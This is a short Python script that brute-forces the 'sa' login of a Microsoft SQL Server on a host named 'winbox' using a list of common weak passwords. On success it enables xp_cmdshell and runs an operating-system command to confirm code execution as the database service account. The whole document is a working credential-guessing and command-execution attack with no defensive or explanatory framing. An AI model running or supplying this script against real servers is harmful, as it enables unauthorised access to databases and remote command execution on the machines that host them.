#!/usr/bin/env python3
import pymssql

# Common weak passwords IT teams use for "internal" services
passwords = ['Password1', 'Password123', 'sa', 'admin', 'SQL2022',
             'P@ssw0rd', 'Welcome1', 'Summer2024', 'Company123']

for pwd in passwords:
    try:
        conn = pymssql.connect('winbox', 'sa', pwd)
        print(f'[+] SUCCESS: sa/{pwd}')
        cur = conn.cursor()
        cur.execute("EXEC sp_configure 'show advanced options',1;RECONFIGURE")
        cur.execute("EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE")
        cur.execute("EXEC xp_cmdshell 'whoami'")
        for row in cur:
            if row[0]: print(f'Running as: {row[0]}')
        break
    except: pass
